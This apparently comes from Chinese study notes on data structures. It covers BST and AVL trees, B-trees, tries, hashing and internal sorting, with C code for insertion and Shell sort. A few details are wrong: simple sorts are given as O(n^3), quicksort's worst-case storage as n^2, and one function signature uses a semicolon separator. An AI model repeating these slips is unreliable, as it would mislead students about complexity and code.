<h3 id="9-2-1-二叉排序树和平衡二叉树"><a href="#9-2-1-二叉排序树和平衡二叉树" class="headerlink" title="9.2.1 二叉排序树和平衡二叉树"></a>9.2.1 二叉排序树和平衡二叉树</h3><ol>
<li><p><strong>二叉排序树（Binary Sort Tree，BST，二叉查找树）</strong>或者是一棵空树，或者是具有下列性质的二叉树：</p>
<ul>
<li>若左子树不空，则左子树上<strong>所有</strong>结点的值<strong>均小于</strong>它的根结点的值；</li>
<li>若右子树不空，则右子树上<strong>所有</strong>结点的值<strong>均大于</strong>它的根结点的值；</li>
<li>它的左右子树也分别为二叉排序树。</li>
</ul>
</li>
<li><p>二叉排序树的查找过程和次优二叉树类似，但和次优二叉树相对，二叉排序树是一种动态树表。</p>
</li>
<li><p>二叉排序树中，新插入的结点一定是一个新添加的叶子结点，而且是查找不成功时查找路径上访问的最后一个结点的左孩子或右孩子结点。</p>
<p>即，插入时不必移动其他结点，仅需改动某个结点的指针，由空变为非空即可。</p>
</li>
<li><p>中序遍历二叉排序树可以得到关键字的有序序列，即一个无序序列可以通过构造一棵二叉排序树而变成一个有序序列。</p>
</li>
<li><p>二叉排序树既有类似于折半查找的特性，又采用了链表作存储结构，因此是动态查找表的一种适宜表示。</p>
</li>
<li><p>当删除二叉排序树的一个结点时，若待删除结点为叶子结点，或只有左子树，或只有右子树时，删除都很容易。</p>
<p>当待删除结点的左右子树均不空时，为保持其他元素之间的相对位置不变，可以有两种做法：</p>
<ul>
<li>将其左子树给双亲、右子树给左子树最右下角的叶子结点；</li>
<li>令待删除结点的直接前驱（或直接后继）替代待删除结点，再删去它的直接前驱（或直接后继），再相应地改变子树。</li>
</ul>
</li>
<li><p>含有n个结点的判定树是唯一的，但二叉排序树并不唯一，而且平均查找长度也和树的形态有关：</p>
<p>最坏的情况：先后插入的关键字有序，此时树的深度为n，ASL=(n+1)/2，和顺序查找相同。</p>
<p>最好的情况：形态和折半查找的判定树相同，ASL和$log_{2}n$成正比。</p>
<p>在随机的情况下，二叉排序树的平均查找长度和logn是等数量级的；然而在某些情况下，需要在构成二叉排序树的过程中进行“平衡化”处理，成为二叉平衡树。</p>
</li>
<li><p><strong>平衡二叉树（Balanced Binary Tree，Height-Balanced Tree，AVL树）</strong>或者是一棵空树，或者是具有下列性质的树：</p>
<ul>
<li>它的左子树和右子树都是平衡二叉树；</li>
<li>左子树和右子树的深度之差的绝对值不超过1。</li>
</ul>
</li>
<li><p>（结点的）<strong>平衡因子（Balance Factor，BF）</strong>是该结点的左子树的深度减去减去它的右子树的深度。</p>
<p>AVL树上所有结点的BF可能的取值为-1、0和1。</p>
</li>
<li><p>AVL树的深度和logn是同数量级的，则它的ASL也和logn同数量级。</p>
</li>
<li><p>构造平衡二叉树的平衡旋转技术：</p>
<ul>
<li><p>单向右旋平衡处理（LL）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/LL.png" alt="LL"></p>
</li>
<li><p>单向左旋平衡处理（RR）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/RR.png" alt="RR"></p>
</li>
<li><p>双向旋转（先左后右）平衡处理（LR）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/LR.png" alt="LR"></p>
</li>
<li><p>双向旋转（先右后左）平衡处理（RL）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/RL.png" alt="RL"></p>
</li>
</ul>
<p>特点：</p>
<ul>
<li>对不平衡的最小子树操作；</li>
<li>旋转后树根结点BF=0；</li>
<li>旋转后子树深度不变故不影响全树，也不影响插入路径上所有祖先结点的平衡度。</li>
</ul>
</li>
<li><p>在平衡二叉树上进行查找的时间复杂度为O(logn)。</p>
</li>
<li><p>二叉排序树（二叉查找树）、平衡二叉树、最优二叉树和次优二叉树都是二叉树，查找方法一样；但前两者为动态树表，后两者是静态树表。</p>
</li>
</ol>
<h3 id="9-2-2-B-树和B-树"><a href="#9-2-2-B-树和B-树" class="headerlink" title="9.2.2 B-树和B+树"></a>9.2.2 B-树和B+树</h3><ol>
<li><p>B-树是一种平衡的多路查找树，或为空树，或为满足下列特性的m叉树：</p>
<ul>
<li>每个结点至多有m棵子树；</li>
<li>若根结点不是叶子结点，则至少有两棵子树；</li>
<li>内部结点至少有$\lceil m/2\rceil$棵子树；</li>
<li>所有的非叶子结点包含信息数据(n,A0,K1,A1,K2,A2,…,Kn,An)，其中K为关键字（<strong>升序</strong>），A为指向树根结点的指针，且Ai-1所指子树中所有结点的关键字均小于Ki，An所指子树中所有结点的关键字均大于Kn，n为关键字的个数（n+1为子树个数）；</li>
<li>所有的叶子结点都出现在同一层次上，并且不带信息。</li>
</ul>
<p>4阶的B-树：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/4%E9%98%B6B-%E6%A0%91.png" alt="4阶B-树"></p>
</li>
<li><p>3阶B-树也叫2-3树。</p>
</li>
<li><p>B-树的查找操作包含找结点和找关键字。在m阶含有N个关键字（$N\ge \lceil m/2\rceil-1$）的B-树上进行查找时，从根结点到关键字所在结点的路径上涉及的结点数不超过$log_{\lceil m/2\rceil}(\frac{N+1}{2})+1$。</p>
</li>
<li><p>B-树的每次插入一个关键字不是添加叶子结点，而是首先在某个非叶子结点中添加一个关键字，若此结点的关键字个数超过m-1，则要产生结点的“分裂”，关键字$K_{\lceil m/2\rceil}$和前后指针插入到双亲结点。</p>
</li>
<li><p>B-树的每次删除一个关键字要首先找到该关键字所在结点进行删除，若结点为叶子结点或关键字数目少于$_{\lceil m/2\rceil}$，则需进行结点的“合并”。</p>
</li>
<li><p>B+树是B-树的变型树，不再是第6章中定义的树：</p>
<ul>
<li>关键字个数等于子树个数；</li>
<li>全部关键字信息都在叶子结点，同时还包含指向含这些关键字记录的指针，且叶子结点本身依关键字的大小自小而大顺序链接；</li>
<li>所有的非叶子结点都是索引，这些结点仅含有子树（根结点）中的最大（或最小）关键字。</li>
</ul>
<p>3阶的B+树：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/3-Bplus.png"></p>
</li>
<li><p>B+树有两个头指针，分别指向根结点和关键字最小的叶子结点，因此可以对B+树进行两种查找运算：</p>
<ul>
<li>从最小关键字起顺序查找；</li>
<li>从根结点开始随机查找。</li>
</ul>
</li>
<li><p>B+树的每次查找都走到叶子结点，插入与删除也只在叶子结点进行，并相应地分裂与合并。</p>
</li>
</ol>
<h3 id="9-2-3-键树"><a href="#9-2-3-键树" class="headerlink" title="9.2.3 键树"></a>9.2.3 键树</h3><ol>
<li><p><strong>键树</strong>又称<strong>数字查找树（Digital Search Tree）</strong>，是一棵度≥2的树，树中的每个结点中不是包含关键字，而是只含有组成关键字的符号（数位或字符等）。</p>
</li>
<li><p>集合、子集和元素之间的层次关系可以用一棵树来表示，这棵树便为键树：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E9%94%AE%E6%A0%91%E7%A4%BA%E4%BE%8B.png"></p>
</li>
<li><p>约定键树是有序树，且同一层中自左至右有序，结束符$小于任何字符。</p>
</li>
<li><p>键树的存储结构：</p>
<ul>
<li><p>孩子兄弟链表：</p>
<p>分支结点包括3个域：</p>
<ul>
<li>symbol域存储关键字的一个字符；</li>
<li>first域存储指向第一棵子树根的指针；</li>
<li>next域存储指向右兄弟的指针；</li>
</ul>
<p>叶子结点的infoptr存储指向该关键字记录的指针。</p>
<p>此时的键树又称<strong>双链树</strong>。</p>
</li>
<li><p>多重链表：</p>
<p>每个结点含有d个指针域（d是每个结点的最大度），此时的键树又称Trie树。</p>
</li>
</ul>
</li>
</ol>
<h2 id="9-3-哈希表"><a href="#9-3-哈希表" class="headerlink" title="9.3 哈希表"></a>9.3 哈希表</h2><h3 id="9-3-1-什么是哈希表"><a href="#9-3-1-什么是哈希表" class="headerlink" title="9.3.1 什么是哈希表"></a>9.3.1 什么是哈希表</h3><ol>
<li>前面讨论的各种结构中，记录在结构中的相对位置是随机的，查找的效率依赖于查找过程中所进行的比较次数。所以理想的情况是不进行比较而通过一次存取就能得到所查记录，即关键字和它的存储位置有一个对应关系，则称这个对应关系为<strong>哈希（Hash）函数</strong>。</li>
<li>哈希函数是一个映像，很灵活，只要满足函数值都在表长允许的范围内即可。</li>
<li>若不同的关键字却得到了同一哈希地址，则称这种现象为<strong>冲突（collision）</strong>，这两个关键字是<strong>同义词（synonym）</strong>。</li>
<li>冲突只能尽可能减少，而不能完全避免，因为哈希函数一般就是一个压缩的映像。</li>
<li>所以，根据设定的哈希函数，以及处理冲突的方法，就可以将一组关键字映像到一个有限连续地址集（区间）上，这种表就是<strong>哈希表</strong>，这种映像过程称为哈希造表或<strong>散列</strong>，这种存储位置称为<strong>哈希地址</strong>或<strong>散列地址</strong>。</li>
</ol>
<h3 id="9-3-2-哈希函数的构造方法"><a href="#9-3-2-哈希函数的构造方法" class="headerlink" title="9.3.2 哈希函数的构造方法"></a>9.3.2 哈希函数的构造方法</h3><ol>
<li>哈希函数应试图将冲突减到最少，所以哈希函数应使映像到地址集合中任何一个地址的概率均等，从而使一组关键字的哈希地址均匀分布，此类哈希函数为<strong>均匀的（Uniform）</strong>哈希函数。</li>
<li>常用的构造哈希函数的方法：<ul>
<li><strong>直接定址法</strong>：H(key)=key或H(key)=a·key+b</li>
<li><strong>数字分析法</strong>：取关键字的若干数位组成哈希地址</li>
<li><strong>平方取中法</strong>：取关键字平方后的中间几位为哈希地址</li>
<li><strong>折叠法</strong>：均匀分割关键字，取各部分叠加和（舍去进位）为哈希地址</li>
<li><strong>除留余数法</strong>：H(key)=key MOD p, p≤m（可以选p为质数或不包含小于20的质因数的合数）</li>
<li><strong>随机数法</strong>：H(key)=random(key)</li>
</ul>
</li>
</ol>
<h3 id="9-3-3-处理冲突的方法"><a href="#9-3-3-处理冲突的方法" class="headerlink" title="9.3.3 处理冲突的方法"></a>9.3.3 处理冲突的方法</h3><ol>
<li><p>处理冲突，就是为关键字另找一个“空”的哈希地址。</p>
</li>
<li><p>常用的处理冲突的方法：</p>
<ul>
<li><p><strong>开放定址法</strong>：Hi=(H(key)+di) MOD m（m为哈希表表长，d为增量序列，可以是：1～m-1（线性探测再散列）、$\pm k^{2}$（二次探测再散列）、伪随机数（伪随机探测再散列））</p>
<p>采用线性探测法处理散列时的冲突，当从哈希表删除一个记录时，不应将这个记录所在位置置空，因为这会影响以后的查找（遇空终止）。</p>
</li>
<li><p><strong>再哈希法</strong>：Hi=RHi(key)（RHi均是不同的哈希函数）</p>
</li>
<li><p><strong>链地址法</strong>：将所有同义词的记录存储在同一线性链表中</p>
</li>
<li><p><strong>建立一个公共溢出区</strong>：另设向量为溢出表</p>
</li>
</ul>
</li>
</ol>
<h3 id="9-3-4-哈希表的查找及其分析"><a href="#9-3-4-哈希表的查找及其分析" class="headerlink" title="9.3.4 哈希表的查找及其分析"></a>9.3.4 哈希表的查找及其分析</h3><ol>
<li>查找过程和哈希造表的过程基本一致。</li>
<li>由于“冲突”的产生，使得哈希表的查找仍是一个比较的过程，仍需以ASL作为衡量哈希表的查找效率的量度。</li>
<li>比较的个数取决于：哈希函数、处理冲突的方法以及哈希表的饱和程度（装填因子$\alpha=n/m$（记录数/表长）的大小）。</li>
<li>线性探测再散列容易产生记录的二次聚集，而链地址法则不会。</li>
<li>可以证明，下列三种方法的哈希表查找成功时的ASL为：<ul>
<li>线性探测再散列：$S_{nl}\thickapprox \frac{1}{2}(1+\frac{1}{1-\alpha})$</li>
<li>随机探测再散列、二次探测再散列和再哈希：$S_{nr}\thickapprox -\frac{1}{\alpha}ln(1-\alpha)$</li>
<li>链地址法：$S_{nc}\thickapprox 1+\frac{\alpha}{2}$</li>
</ul>
</li>
<li>哈希表的ASL是$\alpha$的函数，而不是n的函数。所以，不管n多大，我们总可以选择一个合适的装填因子，以便将ASL限定在一个范围内。</li>
<li>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-15/">传送门</a>。</li>
</ol>
<h1 id="第10章-内部排序"><a href="#第10章-内部排序" class="headerlink" title="第10章 内部排序"></a>第10章 内部排序</h1><h2 id="10-1-概述"><a href="#10-1-概述" class="headerlink" title="10.1 概述"></a>10.1 概述</h2><ol>
<li><p><strong>排序（Sorting）</strong>是将任意序列重新排列成一个有序序列（按关键字）。</p>
</li>
<li><p>对主关键字的排序结果唯一，对次关键字的排序结果不唯一（可能有相等的情况）。</p>
</li>
<li><p>对于关键字相等的两个记录，若排序前后二者先后顺序不改变，则称所用的<strong>排序方法是稳定的</strong>；反之则称所用的<strong>排序方法是不稳定的</strong>。</p>
</li>
<li><p><strong>内部排序</strong>指的是待排序记录存放在计算机随机存储器中进行的排序过程；</p>
<p><strong>外部排序</strong>指的是待排序记录的数量很大，以致内存一次不能容纳全部记录，在排序过程中尚需对外存进行访问的排序过程。</p>
</li>
<li><p>根据排序原则，可将内部排序分为5类：</p>
<ul>
<li>插入排序</li>
<li>交换排序</li>
<li>选择排序</li>
<li>归并排序</li>
<li>计数排序</li>
</ul>
<p>根据工作量，可将内部排序分为3类：</p>
<ul>
<li>简单的排序方法，时间复杂度为O($n^{3}$)</li>
<li>先进的排序方法，时间复杂度为O(nlogn)</li>
<li>基数排序，时间复杂度为O(d·n)</li>
</ul>
</li>
<li><p>通常，排序需要两个操作：比较和移动。</p>
</li>
<li><p>待排序的记录序列可能有下列3种存储方式：</p>
<ul>
<li><p>存放在<strong>地址连续的一组存储单元</strong>上，类似于线性表的顺序存储结构，记录之间的次序关系由其存储位置决定，则实现排序必须借助移动记录；</p>
</li>
<li><p><strong>（链）表排序</strong>：存放在<strong>静态链表</strong>中，记录之间的次序关系由指针指示，则实现排序不需移动记录，仅需修改指针；</p>
<p>之所以不用动态链表，是因为排序算法仅需改变次序关系，无需进行插入和删除操作，且在排序结束时尚需调整记录；</p>
</li>
<li><p><strong>地址排序</strong>：存放在<strong>地址连续的一组存储单元</strong>上，同时另设一个指示各个记录存储位置的地址向量，则排序时仅需移动“地址”，结束后按地址值调整记录的存储位置。</p>
</li>
</ul>
</li>
</ol>
<h2 id="10-2-插入排序"><a href="#10-2-插入排序" class="headerlink" title="10.2 插入排序"></a>10.2 插入排序</h2><h3 id="10-2-1-直接插入排序"><a href="#10-2-1-直接插入排序" class="headerlink" title="10.2.1 直接插入排序"></a>10.2.1 直接插入排序</h3><ol>
<li><p><strong>直接插入排序（Straight Insertion Sort）</strong>是一种最简单的排序方法，基本操作是将一个记录插入到已排好序的有序表中，从而得到一个新的、记录数增1的有序表：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(SqList &amp;L)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= L.length; ++i)</span><br><span class="line">    <span class="keyword">if</span> (LT(L.r[i].key,L.r[i<span class="number">-1</span>].key)) &#123;</span><br><span class="line">      L.r[<span class="number">0</span>] = L.r[i]; <span class="comment">// copy</span></span><br><span class="line">      L.r[i] = L.r[i<span class="number">-1</span>];</span><br><span class="line">      <span class="keyword">for</span> (j = i - <span class="number">2</span>; LT(L.r[<span class="number">0</span>].key,L.r[j].key); --j)</span><br><span class="line">        L.r[j+<span class="number">1</span>] = L.r[j]; <span class="comment">// move</span></span><br><span class="line">      L.r[j+<span class="number">1</span>] = L.r[<span class="number">0</span>]; <span class="comment">// insert</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>直接插入排序的时间复杂度为O($n^{2}$)。</p>
</li>
<li><p>直接插入排序是一种稳定的排序方法。</p>
</li>
</ol>
<h3 id="10-2-2-其他插入排序"><a href="#10-2-2-其他插入排序" class="headerlink" title="10.2.2 其他插入排序"></a>10.2.2 其他插入排序</h3><ol>
<li><p>当待排序序列中的记录数量n很大时，则不宜采用直接插入排序，应减少“比较”和“移动”的次数。</p>
</li>
<li><p><strong>折半插入排序</strong>：将查找操作利用折半查找来实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BInsertSort</span><span class="params">(SqList &amp;L)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= L.length; ++i) &#123;</span><br><span class="line">    L.r[<span class="number">0</span>] = L.r[i];</span><br><span class="line">    low = <span class="number">1</span>;</span><br><span class="line">    high = i - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">      m = (low + high) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> (LT(L.r[<span class="number">0</span>].key,L.r[m].key))</span><br><span class="line">        high = m - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        low = m + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= high + <span class="number">1</span>; --j)</span><br><span class="line">      L.r[j+<span class="number">1</span>] = L.r[j];</span><br><span class="line">    L.r[high+<span class="number">1</span>] = L.r[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度为O($n^{2}$)，同时也是一种稳定的排序方法。</p>
</li>
<li><p><strong>2-路插入排序</strong>：在折半插入排序的基础上再改进，减少排序过程中移动的次数，需要n个记录的辅助空间。另设一个同类型循环向量，将待排序数组按顺序复制到此向量中，同时设两个指针first和final分别指示有序序列的第一个和最后一个记录的在向量中的位置。</p>
<p>比插入排序减少了一半的移动次数，但不能绝对避免移动。而且当L.r[1]是待排序记录中最小或最大的记录时，2-路插入排序就完全失去了它的优越性。</p>
</li>
<li><p><strong>表插入排序</strong>：若希望彻底避免移动记录，则只能改变存储结构，采用静态链表，修改2n次指针代替移动记录，比较次数相同。时间复杂度仍为O($n^{2}$)。</p>
<p>而且得到的仍是一个链表，虽然有序，但也只能顺序查找，不能随机查找。为实现折半查找，还需重新排列记录（顺序扫描链表，移动结点至数组对应位置（互换、改指针））。</p>
</li>
</ol>
<h3 id="10-2-3-希尔排序"><a href="#10-2-3-希尔排序" class="headerlink" title="10.2.3 希尔排序"></a>10.2.3 希尔排序</h3><ol>
<li><p><strong>希尔排序（Shell’s Sort）</strong>又称“缩小增量排序（Diminishing Increment Sort）”，是一种插入排序的方法，但在时间效率上较前述几种排序方法有较大的改进。</p>
</li>
<li><p>若待排序记录基本上是有序的，或者待排序列很短，则直接插入排序的效率较高。那么何不将待排序序列分割成若干子序列后，再分别进行插入排序呢？这就是希尔排序的基本思想。</p>
</li>
<li><p>子序列的构成不是简单的逐段分割（即不是连续的），而是相隔某个“增量”的记录组成一个子序列。</p>
</li>
<li><p>增量开始时很大，以至于子序列中对象较少，所以排序很快；后来增量逐渐变小，以至于子序列中对象逐渐增多，但已基本有序，所以排序依然很快。</p>
</li>
<li><p>算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellInsert</span><span class="params">(SqList &amp;L, <span class="keyword">int</span> dk)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (i = dk + <span class="number">1</span>; i &lt;= L.length; ++i)</span><br><span class="line">    <span class="keyword">if</span> (LT(L.r[i].key,L.r[i-dk].key)) &#123;</span><br><span class="line">      L.r[<span class="number">0</span>] = L.r[i];</span><br><span class="line">      <span class="keyword">for</span> (j = i - dk; j &gt; <span class="number">0</span> &amp;&amp; LT(L.r[<span class="number">0</span>].key,L.r[j].key); j -= dk)</span><br><span class="line">        L.r[j+dk] = L.r[j];</span><br><span class="line">      L.r[j+dk] = L.r[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellSort</span><span class="params">(SqList &amp;L, <span class="keyword">int</span> dlta[]; <span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; t; ++k)</span><br><span class="line">    ShellInsert(L, dlta[k]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>增量序列可以有各种取法，但增量序列中的值应不含除1之外的公因子，并且最后一个增量值必须等于1。</p>
</li>
<li><p>当n在某个特定的范围内，希尔排序所需的比较和移动次数约为$n^{1.3}$，当n趋于∞时可减少到$n(log_{2}n)^{2}$。</p>
</li>
<li><p>希尔排序是一种不稳定的排序方法。</p>
</li>
</ol>
<h2 id="10-3-快速排序"><a href="#10-3-快速排序" class="headerlink" title="10.3 快速排序"></a>10.3 快速排序</h2><ol>
<li>下面讨论借助“<strong>交换</strong>”进行排序的方法，最简单的一种就是<strong>起泡排序（Bubble Sort）</strong>。</li>
<li>在起泡排序的过程中，关键字较小的记录好比水中气泡逐趟向上漂浮，而关键字较大的记录好比石块往下沉，每一趟有一块“最大”的石头沉到水底。</li>
<li>起泡排序的时间复杂度为O($n^{2}$)，同时也是一个稳定的排序方法。</li>
<li><strong>快速排序（Quick Sort）</strong>是对起泡排序的一种改进，它的基本思想是，选取一个对象作为<strong>枢轴</strong>（pivot，支点、基准），将对象序列分为比它大和比它小的两部分，再继续对子序列重复上述过程，直到所有对象都排在相应位置上。</li>
<li>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-16/">传送门</a>。</li>
<li>快速排序在所有同数量级O(nlogn)的排序方法中是平均性能最好的，但若初始记录序列按关键字有序或基本有序时，快排退化为起泡排序，时间复杂度为O($n^{2}$)。</li>
<li>快速排序是一种不稳定的排序方法。</li>
</ol>
<h2 id="10-4-选择排序"><a href="#10-4-选择排序" class="headerlink" title="10.4 选择排序"></a>10.4 选择排序</h2><p><strong>选择排序（Selection Sort）</strong>的基本思想是，每一趟在后面n-i+1个记录中选取关键字最小的记录作为有序序列中第i个记录。</p>
<h3 id="10-4-1-简单选择排序"><a href="#10-4-1-简单选择排序" class="headerlink" title="10.4.1 简单选择排序"></a>10.4.1 简单选择排序</h3><ol>
<li><strong>直接选择排序（Simple Selection Sort）</strong>：<ul>
<li>在i～n-1中选择关键字最小的；</li>
<li>若它不是这组序列的第一个，就和第一个对调；</li>
<li>在序列中剔除这个最小的，在剩下的序列中重复执行上两步，直到剩余对象只有一个为止。</li>
</ul>
</li>
<li>最坏情况下（元素已经逆序排列），每趟排序移动记录的次数都为3次（两个数组元素交换值），共进行n-1趟排序，总移动次数为3(n-1)。</li>
<li>直接选择排序是一种不稳定的排序方法。</li>
</ol>
<h3 id="10-4-2-树形选择排序"><a href="#10-4-2-树形选择排序" class="headerlink" title="10.4.2 树形选择排序"></a>10.4.2 树形选择排序</h3><ol>
<li><p>体育比赛中的锦标赛的规则是，若乙胜丙，甲胜乙，则认为甲必定能胜丙。</p>
</li>
<li><p><strong>树形选择排序（Tree Selection Sort）</strong>，又称锦标赛排序（Tournament Sort），是一种按照锦标赛思想进行选择排序的方法：</p>
<ul>
<li>首先对n个记录的关键字进行两两比较；</li>
<li>然后在其中$\lceil \frac{n}{2}\rceil$个较小者之间再进行两两比较；</li>
<li>重复上述过程，直至选出最小关键字的记录为止。</li>
</ul>
<p>上面是进行一次排序的过程。选出最小关键字的记录之后，将叶子中的最小关键字改为“最大值”，重复以上过程，就可以依次选出从小到大的所有关键字。</p>
</li>
<li><p>树形选择排序的时间复杂度为O(nlogn)，缺点是辅助存储空间较多、和最大值作多余的比较等。</p>
</li>
</ol>
<h3 id="10-4-3-堆排序"><a href="#10-4-3-堆排序" class="headerlink" title="10.4.3 堆排序"></a>10.4.3 堆排序</h3><ol>
<li><strong>堆排序（Heap Sort）</strong>只需要一个记录大小的辅助空间，每个待排序的记录仅占有一个存储空间。</li>
<li>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-16/">传送门</a>。</li>
<li>堆排序在最坏的情况下，时间复杂度也为O(nlogn)，同时堆排序是一个不稳定的排序方法。</li>
</ol>
<h2 id="10-5-归并排序"><a href="#10-5-归并排序" class="headerlink" title="10.5 归并排序"></a>10.5 归并排序</h2><ol>
<li><strong>归并</strong>是将两个或两个以上的有序表组合成一个新的有序表。</li>
<li>可以将n个记录看成是n个有序的子序列，然后两两归并，得到$\lceil \frac{n}{2}\rceil$个长度为2或1的有序子序列，再重复两两归并，直至得到一个长度为n的有序序列为止，这种排序方法称为<strong>2-路归并排序</strong>。</li>
<li>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-17/">传送门</a>。</li>
<li>实现归并排序需和待排记录等数量的辅助空间，其时间复杂度为O(nlogn)。归并排序是一个稳定的排序方法。</li>
</ol>
<h2 id="10-6-基数排序"><a href="#10-6-基数排序" class="headerlink" title="10.6 基数排序"></a>10.6 基数排序</h2><p><strong>基数排序（Radix Sorting）</strong>是一种借助多关键字排序思想，对单逻辑关键字进行排序的方法，不需要进行记录关键字间的比较。</p>
<h3 id="10-6-1-多关键字的排序"><a href="#10-6-1-多关键字的排序" class="headerlink" title="10.6.1 多关键字的排序"></a>10.6.1 多关键字的排序</h3><p>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-17/">传送门</a>。</p>
<h3 id="10-6-2-链式基数排序"><a href="#10-6-2-链式基数排序" class="headerlink" title="10.6.2 链式基数排序"></a>10.6.2 链式基数排序</h3><ol>
<li>基数排序：借助“分配”和“收集”对单逻辑关键字进行排序。</li>
<li>链式基数排序方法：用链表作存储结构的基数排序。</li>
</ol>
<h2 id="10-7-各种内部排序方法的比较讨论"><a href="#10-7-各种内部排序方法的比较讨论" class="headerlink" title="10.7 各种内部排序方法的比较讨论"></a>10.7 各种内部排序方法的比较讨论</h2><table>
<thead>
<tr>
<th>排序方法</th>
<th>最好比较次数</th>
<th>最坏比较次数</th>
<th>最好移动次数</th>
<th>最坏移动次数</th>
<th>稳定性</th>
<th>最好附加存储</th>
<th>最坏附加存储</th>
</tr>
</thead>
<tbody><tr>
<td>简单排序</td>
<td>n</td>
<td>$n^{2}$</td>
<td>0</td>
<td>$n^{2}$</td>
<td>好</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>折半插入排序</td>
<td>nlogn</td>
<td>nlogn</td>
<td>0</td>
<td>$n^{2}$</td>
<td>好</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>快速排序</td>
<td>nlogn</td>
<td>$n^{2}$</td>
<td>nlogn</td>
<td>$n^{2}$</td>
<td>差</td>
<td>logn</td>
<td>$n^{2}$</td>
</tr>
<tr>
<td>简单选择排序</td>
<td>$n^{2}$</td>
<td>$n^{2}$</td>
<td>0</td>
<td>n</td>
<td>差</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>锦标赛排序</td>
<td>nlogn</td>
<td>nlogn</td>
<td>nlogn</td>
<td>nlogn</td>
<td>好</td>
<td>n</td>
<td>n</td>
</tr>
<tr>
<td>堆排序</td>
<td>nlogn</td>
<td>nlogn</td>
<td>nlogn</td>
<td>nlogn</td>
<td>差</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>归并排序</td>
<td>nlogn</td>
<td>nlogn</td>
<td>nlogn</td>
<td>nlogn</td>
<td>好</td>
<td>n</td>
<td>n</td>
</tr>
<tr>
<td>基数排序</td>
<td>d(n+rd)</td>
<td>d(n+rd)</td>
<td>d(n+rd)</td>
<td>d(n+rd)</td>
<td>好</td>
<td>rd</td>
<td>rd</td>
</tr>
</tbody></table>
<ol>
<li>就平均时间性能而言，快排最佳，其所需时间最省，但其在最坏情况下的时间性能不如堆排序和归并排序。</li>
<li>n较大时，归并排序比堆排序省时间，但它所需的辅助存储量最多。</li>
<li>“简单排序”包括除希尔排序、折半插入排序之外的插入排序，以及起泡排序。</li>
<li>简单排序中，直接插入排序最简单，当序列基本有序或n较小时，是最佳的排序方法。</li>
<li>基数排序的时间复杂度也可写成O(d·n)，最适用于n很大而关键字较小的序列。若关键字也很大，而序列中大多数记录的“最高位关键字”均不同，则也可以按“最高位关键字”不同将序列分成若干“小”的子序列，而后进行直接插入排序。</li>
<li>基数排序是最稳定的内排方法，所有时间复杂度为O($n^{2}$)的简单排序法也是稳定的。然而，快排、堆排序和希尔排序等时间性能较好的排序方法都是不稳定的。</li>
<li>一般来说，排序过程中的“比较”在“相邻的两个记录关键字”间进行的排序方法是稳定的。</li>
<li>由于大多数情况下排序按记录的主关键字进行，则所用的排序方法是否稳定无关紧要。</li>
<li>借助于“比较”进行排序的算法在最坏情况下能达到的最好的时间复杂度为O(nlogn)。</li>
</ol>
<h1 id="第11章-外部排序"><a href="#第11章-外部排序" class="headerlink" title="第11章 外部排序"></a>第11章 外部排序</h1><h1 id="第12章-文件"><a href="#第12章-文件" class="headerlink" title="第12章 文件"></a>第12章 文件</h1>]]></content>
      <tags>
        <tag>Notes</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
</search>
